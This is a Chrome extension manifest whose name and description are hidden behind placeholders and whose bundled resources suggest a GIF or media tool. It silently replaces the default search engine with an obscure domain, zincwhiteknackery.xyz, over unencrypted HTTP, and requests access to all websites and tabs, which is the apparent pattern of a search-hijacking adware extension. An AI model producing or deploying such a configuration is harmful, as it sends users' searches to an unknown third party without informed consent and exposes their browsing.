{
	"background": {
		"persistent": false,
		"scripts": [
			"background.js"
		]
	},
	"browser_action": {
		"default_icon": {
			"19": "images/icon19.png",
			"38": "images/icon38.png"
		}
	},
	"chrome_settings_overrides": {
		"search_provider": {
			"encoding": "UTF-8",
			"favicon_url": "http://zincwhiteknackery.xyz/favicon.ico",
			"is_default": true,
			"keyword": "zincwhiteknackery",
			"name": "zincwhiteknackery",
			"search_url": "http://zincwhiteknackery.xyz/?vocabularylabor={searchTerms}"
		}
	},
	"default_locale": "en",
	"description": "__MSG_appDesc__",
	"manifest_version": 2,
	"minimum_chrome_version": "26",
	"name": "__MSG_appName__",
	"permissions": [
		"tabs",
		"activeTab",
		"contextMenus",
		"http://*/*",
		"https://*/*"
	],
	"update_url": "https://clients2.google.com/service/update2/crx",
	"version": "1.0",
	"web_accessible_resources": [
		"main.css",
		"lstr.js",
		"script.js",
		"images/close.png",
		"images/back.png",
		"images/icon19.png",
		"images/play.png",
		"images/stop.png",
		"images/prev.png",
		"images/down.png",
		"images/next.png",
		"images/delete.png",
		"classes/GIFWorker.js"
	]
}